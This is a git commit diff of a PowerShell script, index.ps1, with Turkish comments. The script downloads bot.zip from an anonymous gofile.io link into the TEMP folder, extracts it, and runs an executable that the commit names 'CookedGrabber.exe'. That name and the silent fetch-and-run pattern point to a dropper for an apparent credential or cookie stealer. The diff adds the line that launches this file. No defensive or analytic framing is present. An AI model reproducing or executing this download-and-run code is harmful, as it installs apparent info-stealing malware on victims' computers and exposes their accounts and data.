9f4f18b49fc7c3fd8d96ff4b79b5f2d46ce5fbd9
doguiaste <143461390+doguiaste@users.noreply.github.com>
2025-07-08 18:51:39 +0300

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,12 +1,12 @@
 $zipUrl = "https://store-eu-par-3.gofile.io/download/web/9ce7760f-8dde-4764-afef-2dac1a25933c/bot.zip"
 $zipPath = "$env:TEMP\bot.zip"
-$extractPath = "$env:TEMP\cikartildi"
+$extractPath = "$env:TEMP\cikartilan"
 
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
-Start-Sleep -Seconds 30  # Bekle biraz, dosya tam insin
+Start-Sleep -Seconds 2  # indirmenin tamamlanmasını bekle
 
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
 
-$exe = Get-ChildItem -Path $extractPath -Filter *.exe -Recurse | Select-Object -First 1
-Start-Process -FilePath $exe.FullName
+$exePath = Join-Path $extractPath "CookedGrabber.exe"
+Start-Process -FilePath $exePath
